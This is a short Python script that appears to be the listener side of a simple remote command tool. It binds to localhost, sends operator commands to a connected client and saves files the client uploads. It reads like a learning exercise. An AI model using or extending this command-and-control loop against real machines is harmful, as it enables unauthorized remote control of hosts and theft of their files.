import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1',3333))
sock.listen()

def handle_file():
    name = client.recv(1024).decode()
    data = client.recv(99999)
    with open(name + "e", "wb") as file:
        file.write(data)
    print(f"-- saved file as {name}")

def commmands():
     while True:
        cmd = input(">>")
        if cmd:
            client.send(cmd.encode())
            break
        else:
            print("+")

def responses():
    response = client.recv(9999).decode()
    match response:
        case "<FILE>":
            handle_file()
        case "<CRTD>":
            print("executed!")
        case _:
            print(response)

while True:
    client, address = sock.accept()
    print(f"[*] client: {address}, Enter a command or 'exit' to quit.")

    while True:
        try:
            commmands() #handles command and validation
            responses() #handles response and validation
            
        except Exception as e:
            client.close()
            print(f"[!] Client disconnected {address}, Waiting for clients...")
            break
